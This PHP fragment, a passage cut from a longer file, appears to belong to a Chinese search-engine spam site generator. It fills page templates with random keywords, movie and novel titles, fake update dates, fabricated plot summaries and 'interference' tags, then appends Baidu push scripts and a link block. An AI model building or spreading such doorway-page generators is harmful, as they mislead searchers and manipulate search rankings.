	    $fanmulu = $WebSiteInfo['fanmulu'][$i];
    	if($fanmulu != ""){
    	    $tpl = str_replace('{#泛目录'.$i.'}', $fanmulu, $tpl);
    	}  
	}
	
    //站长验证代码
    $tpl = site_vcode($WebSiteInfo['baidu-site-vcode'], $tpl);
    //干扰标签
	$tpl = randReplaceLabel('新的干扰标签', rand(30,80), 'none'); 
	//干扰标签
    $tpl = randReplaceLabel("随机N个标签");
    //干扰属性
    $tpl = randReplaceAttr("随机属性");
    
    
	//时间
	$tpl = str_replace('{#yyyy-MM-dd hh:mm:ss}', date('Y-m-d H:i:s'), $tpl);
	$tpl = str_replace('{#yyyy-MM-dd hh:mm}', date('Y-m-d H:i'), $tpl);
	$tpl = str_replace('{#yyyyMMddhhmmss}', date('YmdHis'), $tpl);
	$tpl = str_replace('{#yyyy-MM-dd}', date('Y-m-d'), $tpl);
	$tpl = str_replace('{#yyyyMMdd}', date('Ymd'), $tpl);
	$tpl = str_replace('{#MM-dd}', date('m-d'), $tpl);
	$tpl = str_replace('{#yyyy}', date('Y'), $tpl);
	$tpl = str_replace('{#y}', date('Y'), $tpl);
	$tpl = str_replace('{#md}', date('md'), $tpl);
	$tpl = str_replace('{#m}', date('m'), $tpl);
	$tpl = str_replace('{#d}', date('d'), $tpl); 
	$tpl = randReplaceDateTime('随机更新时间', 'datetime');
	$tpl = randReplaceDateTime('随机日期时间', 'datetime');
	$tpl = randReplaceDateTime('随机年份', 'year');
	
	
    //替换随机数和随机字符
    for($i=1; $i<=20; $i++){
        $tpl = randReplaceChar('随机数'.$i, $i, 'n');//替换随机数
        $tpl = randReplaceChar('sz'.$i, $i, 'n');//替换随机数
        
        $tpl = randReplaceChar('随机字符'.$i, $i, 'l');//替换字符
        $tpl = randReplaceChar('zf'.$i, $i, 'l');//替换字符
        $tpl = randReplaceChar('sf'.$i, $i, 'l');//替换字符
        
        $tpl = randReplaceChar('随机字符数'.$i, $i, 'ln');//替换随字符个数类型 l，n，ln
        $tpl = randReplaceChar('szzf'.$i, $i, 'c');//替换字符
    }
    
    
    
    
    //替换大小数字
    $tpl = randReplaceNumber('随机数1位', 1, 9); 
    $tpl = randReplaceNumber('随机数1-2位', 1, 99);
    $tpl = randReplaceNumber('随机数1-3位', 1, 999);
    $tpl = randReplaceNumber('随机数2位', 10, 99);
    $tpl = randReplaceNumber('随机数2-3位', 10, 999);
    $tpl = randReplaceNumber('随机数2-4位', 10, 9999);
    $tpl = randReplaceNumber('随机数3位', 100, 999);
    $tpl = randReplaceNumber('随机数3-4位', 100, 9999);
    $tpl = randReplaceNumber('随机数3-5位', 100, 99999);
    $tpl = randReplaceNumber('随机数4位', 1000, 9999); 
    $tpl = randReplaceNumber('随机数4-5位', 1000, 99999);
    $tpl = randReplaceNumber('随机数4-6位', 1000, 999999);
    $tpl = randReplaceNumber('随机数4-7位', 1000, 9999999);
    $tpl = randReplaceNumber('随机数4-8位', 1000, 99999999);
    $tpl = randReplaceNumber('随机数5位', 10000, 99999);
    $tpl = randReplaceNumber('随机数5-6位', 10000, 999999);
    $tpl = randReplaceNumber('随机数5-7位', 10000, 9999999);
    $tpl = randReplaceNumber('随机数5-8位', 10000, 99999999);
    $tpl = randReplaceNumber('随机数6位', 100000, 999999);
    $tpl = randReplaceNumber('随机数6-7位', 100000, 9999999);
    $tpl = randReplaceNumber('随机数6-8位', 100000, 99999999);
    $tpl = randReplaceNumber('随机数6-9位', 100000, 999999999);
    $tpl = randReplaceNumber('随机数7位', 1000000, 9999999);
    $tpl = randReplaceNumber('随机数8位', 10000000, 99999999);
    
    
    //替换随机数和随机字符
    for($i=1; $i<=10; $i++){
        $tpl = randReplaceNumber_1('随机数'.$i.'位');
        for($k=2; $k<=10; $k++){
            $tpl = randReplaceNumber_1('随机数'.$i.'-'.$k.'位'); 
            $tpl = randReplaceNumber_1('随机数'.$i.','.$k.'位');
        }
    }
    
    
    //指数电影名
	$filmNameArr = getDataArr("data", "dianyingming");
	$tpl = str_replace('{#指数电影名}', rtrim(rtrim($filmNameArr[0]),PHP_EOL), $tpl);
	
	
    //电影长尾词
    $filmWordArr = getDataArr("data", "dianyingchangweici_1");
	$tpl = str_replace('{#电影长尾词}', rtrim(rtrim($filmWordArr[0]),PHP_EOL), $tpl);
	//电影长尾词
	$filmWordArr = getDataArr("data", "dianyingchangweici");
	$tpl = str_replace('{#电影长尾词1}', rtrim(rtrim($filmWordArr[1]),PHP_EOL), $tpl);
	$tpl = str_replace('{#电影长尾词2}', rtrim(rtrim($filmWordArr[2]),PHP_EOL), $tpl);
	$tpl = str_replace('{#电影长尾词3}', rtrim(rtrim($filmWordArr[3]),PHP_EOL), $tpl);
	$tpl = randReplace('电影长尾词', 'data', 'dianyingchangweici');
	
	
	//小说长尾词
	$storyWordArr = getDataArr("data", "xiaoshuochangweici");
	$tpl = str_replace('{#小说长尾词}', rtrim(rtrim($filmWordArr[0]),PHP_EOL), $tpl);
	//小说长尾词
	$storyWordArr = getDataArr("data", "xiaoshuochangweici");
	$tpl = str_replace('{#小说长尾词1}', rtrim(rtrim($filmWordArr[1]),PHP_EOL), $tpl);
	$tpl = str_replace('{#小说长尾词2}', rtrim(rtrim($filmWordArr[2]),PHP_EOL), $tpl);
	$tpl = str_replace('{#小说长尾词3}', rtrim(rtrim($filmWordArr[3]),PHP_EOL), $tpl);
	$tpl = randReplace('小说长尾词', 'data', 'xiaoshuochangweici');
    
    
    //剧情介绍
	$dataJuziArr = getDataArr("data", "juzi");
	$juqingArr = array(rtrim($dataJuziArr[0],PHP_EOL).rtrim($dataJuziArr[3],PHP_EOL), rtrim($dataJuziArr[1],PHP_EOL).rtrim($dataJuziArr[2],PHP_EOL).rtrim($dataJuziArr[4],PHP_EOL));
	$juqingStr = $juqingArr[array_rand($juqingArr,1)]; 
	$tpl = str_replace('{#剧情介绍}', '该剧讲述了'.mbStrSplit($juqingStr), $tpl);
	
    
    //读取视频
	$playUrlArr = getDataArr("data", "playurl");
	$tpl = str_replace('{#播放地址}', rtrim(rtrim($playUrlArr[0]),PHP_EOL), $tpl);
    
    
    //获取关键词
    $keywordsUrlArr = getDataArr("data", "bendi_1");
    //获取对应关键词
    $keyword_real = getUrlKeyword($url_real);
    if (empty($keyword_real)) {
        $keyword_real = rtrim(rtrim($keywordsUrlArr[0]),PHP_EOL);
        saveCurrentUrlKeyword($url_real, $keyword_real);
    }
	$tpl = str_replace('{#对应关键词}', unicode_encode(rtrim(rtrim($keyword_real),PHP_EOL)), $tpl); 
	$tpl = str_replace('{#对应链接}', $currUrl, $tpl);
	
// 	//随机章节
// 	$tpl = str_replace('{#文章}', $content, $tpl);//替换文章标签
// 	$zhangjie =file_get_contents("../data/szhang/".rand(1,100).'.txt');
// 	$tpl=str_replace('{#随机章节}',$zhangjie,$tpl);
    
    
    //本地关键词
	$tpl = randReplace('本地关键词','data','bendi_1', 0, 500, true);
	$tpl = randReplace('随机关键词','data','bendi_1',0,500,true); 
	$tpl = randReplace('关键词', 'data', "bendi_1", 1, 500, true); 
	
	
// 	$macxiaoshuo = file_get_contents("../data/macxiaoshuo/mac_vod (".rand(1,5).").json");
// 	$data_xiaoshuo = json_decode($macxiaoshuo, true); 

    // //小说数据
    // // $tpl = randReplace('小说', 'data', 'macxiaoshuo'); 
    // $tpl = randReplace('小说', 'data', 'macxiaoshuo', 1, 50, true);  
    
//     $macxiaoshuo = file_get_contents("../data/macdianying/mac_vod (".rand(1,21).").json");
// 	$data_xiaoshuo = json_decode($macxiaoshuo, true);

    // //电影数据
    // // $tpl = randReplace('电影', 'data', 'macdianying'); 
    // $tpl=randReplace('电影', 'data', 'macdianying', 1, 50, true); 
    
    //城市
    $tpl=randReplace('城市','data','chengshi');
    
    //导演
    $tpl=randReplace('导演','data','name1');
    $tpl=randReplace('演员','data','name1');
    $tpl=randReplace('主演','data','name1');
    
	//目录
	$tpl=randReplace('目录', 'data', 'mulu');
	//标题
	$tpl=randReplace('标题','data','title');
	$tpl=randReplace('标题','data','title', 1, 10);
    //作者
	$tpl=randReplace('作者','data','zuozhe');
    //小说类
	$tpl=randReplace('小说类','data','xiaoshuolei');
	//小说名
	$tpl=randReplace('小说名','data','xiaoshuo');
	//章节
	$tpl=randReplace('章节','data','zhangjie');
	//语言
    $tpl=randReplace('语言','data','yuyan');
    $tpl=randReplace('语言','data','yuyan',1,30); 
	//句子
	$tpl=randReplace('句子','data','juzi');
	$tpl=randReplace('句子','data','juzi', 1, 100, true);
    //剧情
    $tpl=randReplace('剧情','data','juqing');
	//图片
	$tpl=randReplace('远程图片','data','images');//远程图片
	$tpl=randReplace('本地图片','img','imgs/mv_images');//本地图片
	//本地图片
	$tpl=randReplace('本地小说图片','img','imgs/xs_images');//本地图片
	$tpl=randReplace('本地美女图片','img','imgs/mv_images');//本地图片
	$tpl=randReplace('本地下载图片','img','imgs/xz_images');//本地图片
	$tpl=randReplace('本地电影图片','img','imgs/dy_images');//本地图片
	
	
// 	//小说数据
// 	$tpl = randReplace('小说', 'cache', 'macxiaoshuo', 1, 150); 
// 	//电影数据
// 	$tpl = randReplace('电影', 'cache', 'macdianying', 1, 150);
// // 	//句子
// // 	$tpl=randReplace('句子','cache','juzi');
// // 	$tpl=randReplace('句子','cache','juzi',0,0,true);
// 	//替换关键词
// 	$tpl = randReplace('关键词', 'cache', $keywordsSel, 1, 500, true); 
// // 	$tpl = randReplace('对应关键词', 'cache', $keywordsSel, 1, 300, true);
// 	//随机关键词
// 	$tpl = randReplace('随机关键词','cache',$keywordsSel);
// 	$tpl = randReplace('随机关键词','cache',$keywordsSel,0,0,true);
//     //导演
//     $tpl=randReplace('导演','cache','name1');
// 	//演员
//     $tpl=randReplace('演员','cache','name1');
//     //替换关键词从Redis,关键词编码
// 	$tpl=str_replace('{#对应关键词}', $keyword_real, $tpl);
// 	$tpl=str_replace('{#对应链接}', $url_real, $tpl);
	
	//电影名
	$tpl=randReplace('电影名','data','dianyingming');
	$tpl=randReplace('电影名','data','dianyingming',0,0,true);
	//自定义内容
	$tpl=randReplace('自定义内容','data','zidingyi');
	//随机数字
	$tpl=randReplace('随机数字','data','num');
	//随机数字2
	$tpl=randReplace('随机数字2','data','num',0,900,10000);
	//视频类
	$tpl=randReplace('视频类','data','shipinlei');
	$tpl=randReplace('视频类','data','shipinlei',0,0,true);
	//类型
	$tpl=randReplace('类型','data','shipinlei');
	//地区
	$tpl=randReplace('地区','data','diqu');
	$tpl=randReplace('地区','data','diqu',0,0,true);
	
	//读取redis数据
// 	$tpl=randReplace('新闻标题','cache','article3',1,10);
	$tpl=randReplace('新闻标题','data','bendi_1', 1, 50);
	
	
	//保存本页关键词数据
	savePageUrlKeywords();
	//释放缓存资源
	$cache_redis_local->close();
	
	
	//写入缓存
	if($Is_OpenCache){
	    //首页缓存时间为1天
	    if($url_real == '/'){
            $cache_file -> set($cachePageKey, $tpl, 86400, $currentDomain);
        } else {
            $cache_file -> set($cachePageKey, $tpl, null, $currentDomain);
        }
	}
	
    $tpl = str_replace('</head>', $load_page_js.'</head>', $tpl);
    $tpl = str_replace('</body>', $baidu_push_js.'</body>', $tpl);
    
    
    //输出解析结果
    if ($config['compress']){
        exit(mac_compress_html($youqing_link.$tpl));
    } else{
	    exit($youqing_link.$tpl);
    }
?>